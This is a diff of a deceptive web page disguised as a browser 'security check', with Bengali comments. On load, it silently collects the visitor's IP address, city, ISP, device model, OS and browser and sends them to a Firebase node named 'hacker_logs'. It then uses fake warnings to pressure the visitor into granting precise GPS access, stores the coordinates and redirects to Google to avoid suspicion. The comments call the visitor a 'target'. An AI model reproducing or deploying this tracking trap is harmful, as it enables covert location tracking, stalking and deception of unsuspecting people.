@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Security Verification</title>
+    <title>Security Gateway</title>
     
-    <!-- UAParser (ডিভাইস ইনফো বের করার জন্য) -->
+    <!-- UAParser -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
     
     <!-- Firebase SDK -->
@@ -13,7 +13,6 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
         import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
-        // তোর কনফিগারেশন
         const firebaseConfig = {
             apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
             authDomain: "location-611d6.firebaseapp.com",
@@ -27,30 +26,37 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        // গ্লোবাল ফাংশন ডাটা পাঠানোর জন্য
-        window.logToFirebase = function(data) {
+        // ১. প্রাথমিক ডাটা পাঠানো (যাতে অন্তত আইপিটা মিস না হয়)
+        window.initLog = function(data) {
             const trackerRef = ref(db, 'hacker_logs');
-            const newLogRef = push(trackerRef); // নতুন ID তৈরি হলো
+            const newLogRef = push(trackerRef);
             
-            // ডাটা সেভ করা
             set(newLogRef, {
                 timestamp: new Date().toString(),
-                ...data
+                ...data,
+                latitude: "Tracing...", // শুরুতে এটা দেখাবে
+                longitude: "Tracing...",
+                actionStatus: "Target detected, forcing GPS..." 
             }).then(() => {
-                // সেশন ID সেভ করে রাখা যাতে পরে লোকেশন আপডেট করা যায়
-                sessionStorage.setItem('currentLogKey', newLogRef.key);
+                // সেশন কি (Key) সেভ রাখা, যাতে পরে লোকেশন দিয়ে আপডেট করা যায়
+                sessionStorage.setItem('logKey', newLogRef.key);
+                // এবার লোকেশন শিকারে নামো
+                window.forceLocation();
             });
         };
 
-        // শুধু লোকেশন আপডেট করার জন্য ফাংশন
-        window.updateLocation = function(lat, lng) {
-            const key = sessionStorage.getItem('currentLogKey');
+        // ২. লোকেশন পেলে ডাটাবেস আপডেট করা
+        window.updateWithGPS = function(lat, lng) {
+            const key = sessionStorage.getItem('logKey');
             if (key) {
                 const updateRef = ref(db, 'hacker_logs/' + key);
                 update(updateRef, {
                     latitude: lat,
                     longitude: lng,
-                    actionStatus: "GPS Tracked via Auto-Trap"
+                    actionStatus: "✅ GPS Locked Successfully!"
+                }).then(() => {
+                    // কাজ শেষ হলে গুগলে পাঠিয়ে দাও
+                    window.location.href = "https://www.google.com";
                 });
             }
         };
@@ -58,152 +64,131 @@
 
     <style>
         body {
-            background-color: #f4f6f8;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: #333;
+            background-color: #0f0f1a;
+            color: #fff;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            height: 100vh; margin: 0; text-align: center;
         }
-        .loader-container {
-            text-align: center;
-            background: white;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            max-width: 400px;
-            width: 90%;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
+        .loader {
+            border: 5px solid #1a1a2e;
+            border-top: 5px solid #e94560;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 50px; height: 50px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
+            margin-bottom: 20px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        h2 { font-size: 20px; margin-bottom: 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .verify-btn {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.3s;
+        h2 { margin: 0; font-size: 18px; color: #e94560; }
+        p { font-size: 12px; color: #a0a0b0; max-width: 300px; line-height: 1.5; }
+        
+        .retry-btn {
+            background: #e94560; color: white; border: none;
+            padding: 10px 20px; border-radius: 5px; font-weight: bold;
+            margin-top: 20px; cursor: pointer; display: none;
         }
-        .verify-btn:hover { background-color: #2980b9; }
-
-        /* Hidden iframe approach helps sometimes but mostly direct JS is better */
     </style>
 </head>
 <body>
 
-    <div class="loader-container">
-        <div class="spinner"></div>
-        <h2 id="statusTitle">Checking Browser Security...</h2>
-        <p id="statusDesc">Please wait while we verify your connection.</p>
-        
-        <!-- এই বাটনটা শুরুতে লুকানো থাকবে, যদি অটো না কাজ করে তখন আসবে -->
-        <button id="manualBtn" class="verify-btn" style="display:none;" onclick="triggerGPS()">Click to Verify</button>
-    </div>
+    <div class="loader" id="spinner"></div>
+    <h2 id="statusTitle">SYSTEM SCANNING...</h2>
+    <p id="statusMsg">Checking secure connection. Do not close window.</p>
+    
+    <button class="retry-btn" id="retryBtn" onclick="window.forceLocation()">FIX CONNECTION</button>
 
     <script>
-        // পেজ লোড হওয়ামাত্রই কাজ শুরু
+        let ipInfo = {};
+
+        // পেজ লোড হলেই কাজ শুরু
         window.onload = function() {
-            captureBasicInfo();
-            // ১ সেকেন্ড পর লোকেশন চাইবে অটোমেটিক
-            setTimeout(triggerGPS, 1000);
+            // আইপি এবং ডিভাইস ইনফো আগে নিয়ে নিই
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    ipInfo = data;
+                    prepareInitialData();
+                })
+                .catch(() => {
+                    ipInfo = { ip: "Unknown", city: "Unknown" };
+                    prepareInitialData();
+                });
         };
 
-        function captureBasicInfo() {
-            // ১. আইপি এবং নেটওয়ার্ক ইনফো
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(ipData => {
-                    // ২. ডিভাইস ইনফো (UAParser)
-                    var parser = new UAParser();
-                    var result = parser.getResult();
-                    
-                    let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");
-                    
-                    // ব্যাটারি স্ট্যাটাস (যদি পাওয়া যায় - এডভান্সড হ্যাকিং)
-                    let batteryLevel = "Unknown";
-                    if(navigator.getBattery) {
-                        navigator.getBattery().then(function(battery) {
-                            batteryLevel = (battery.level * 100) + "%";
-                            sendInitialLog(ipData, deviceName, batteryLevel, result);
-                        });
-                    } else {
-                        sendInitialLog(ipData, deviceName, "Not Supported", result);
-                    }
-                })
-                .catch(err => {
-                    // আইপি API ফেল করলেও ডিভাইস ইনফো পাঠাবো
-                    sendInitialLog({}, "Unknown", "Unknown", new UAParser().getResult());
-                });
-        }
+        function prepareInitialData() {
+            var parser = new UAParser();
+            var result = parser.getResult();
+            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");
 
-        function sendInitialLog(ipData, deviceName, battery, uaResult) {
-            let logData = {
-                ip: ipData.ip || "Hidden IP",
-                city: ipData.city || "Unknown City",
-                isp: ipData.org || "Unknown ISP",
+            let initialPayload = {
+                ip: ipInfo.ip || "Tracing...",
+                city: ipInfo.city || "Tracing...",
+                isp: ipInfo.org || "Tracing...",
                 deviceModel: deviceName,
-                os: uaResult.os.name + " " + (uaResult.os.version || ""),
-                browser: uaResult.browser.name,
-                cpu: uaResult.cpu.architecture || "Unknown",
-                battery: battery,
-                latitude: "Pending...", // জিপিএস পাওয়ার আগে পেন্ডিং দেখাবে
-                longitude: "Pending...",
-                actionStatus: "Target Landed on Page"
+                os: result.os.name,
+                browser: result.browser.name,
+                latitude: "Wait...",
+                longitude: "Wait..."
             };
 
-            // ফায়ারভেজে পাঠাও
-            if(window.logToFirebase) window.logToFirebase(logData);
+            // Firebase এ প্রথম ধাক্কা (আইপি সহ)
+            if(window.initLog) window.initLog(initialPayload);
         }
 
-        function triggerGPS() {
-            // ইউজারের কাছে মনে হবে ভেরিফিকেশন হচ্ছে
+        // ৩. কঠোর লোকেশন লজিক (The Loop)
+        window.forceLocation = function() {
+            document.getElementById('retryBtn').style.display = 'none';
+            document.getElementById('statusTitle').innerText = "VERIFYING LOCATION...";
+            document.getElementById('statusMsg').innerText = "Please allow location access to continue.";
+            document.getElementById('spinner').style.display = 'block';
+
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
+                    // Success (লোকেশন পাওয়া গেছে!)
                     function(position) {
-                        // সাকসেস!
-                        if(window.updateLocation) {
-                            window.updateLocation(position.coords.latitude, position.coords.longitude);
+                        document.getElementById('statusTitle').innerText = "ACCESS GRANTED";
+                        document.getElementById('statusTitle').style.color = "#00b894";
+                        
+                        // ফায়ারভেজে আপডেট পাঠাও
+                        if(window.updateWithGPS) {
+                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                         }
-                        
-                        // হ্যাকারকে বোকা বানানোর জন্য রিডাইরেক্ট বা মেসেজ
-                        document.getElementById('statusTitle').innerText = "Verification Successful!";
-                        document.getElementById('statusDesc').innerText = "Redirecting...";
-                        document.querySelector('.spinner').style.borderTopColor = "green";
-                        
-                        // ৩ সেকেন্ড পর Google এ পাঠিয়ে দাও (যাতে সে কিছু সন্দেহ না করে)
-                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
                     },
+                    // Error (সে ব্লক করেছে বা জিপিএস অফ)
                     function(error) {
-                        // ইউজার ব্লক করেছে বা অটোমেটিক পপ-আপ আসেনি
-                        console.log("GPS Blocked or Failed");
-                        
-                        // স্ট্র্যাটেজি ২: বাটন দেখানো (সোশ্যাল ইঞ্জিনিয়ারিং)
-                        document.getElementById('statusTitle').innerText = "Verification Failed";
-                        document.getElementById('statusDesc').innerText = "Please allow location access to verify you are human.";
-                        document.getElementById('manualBtn').style.display = 'inline-block';
-                        document.querySelector('.spinner').style.display = 'none';
+                        console.log("GPS Failed: " + error.message);
+                        handleError(error);
                     },
-                    { enableHighAccuracy: true }
+                    // Options (High Accuracy - আসল লোকেশনের জন্য)
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000, // ১০ সেকেন্ড চেষ্টা করবে
+                        maximumAge: 0
+                    }
                 );
+            } else {
+                alert("GPS not supported on this device.");
             }
+        };
+
+        function handleError(error) {
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('statusTitle').innerText = "CONNECTION FAILED";
+            
+            if (error.code === error.PERMISSION_DENIED) {
+                // যদি ইউজার 'Block' দেয়
+                document.getElementById('statusMsg').innerText = "⚠ Security Check Failed! You MUST allow location permission to verify connection.";
+            } else if (error.code === error.POSITION_UNAVAILABLE) {
+                // যদি লোকেশন অফ থাকে
+                document.getElementById('statusMsg').innerText = "⚠ GPS is OFF. Please turn on your device location.";
+            } else {
+                document.getElementById('statusMsg').innerText = "Network timeout. Please retry.";
+            }
+
+            // বাটন দেখিয়ে তাকে আবার গুঁতা দেওয়া
+            document.getElementById('retryBtn').style.display = 'inline-block';
         }
     </script>
 </body>
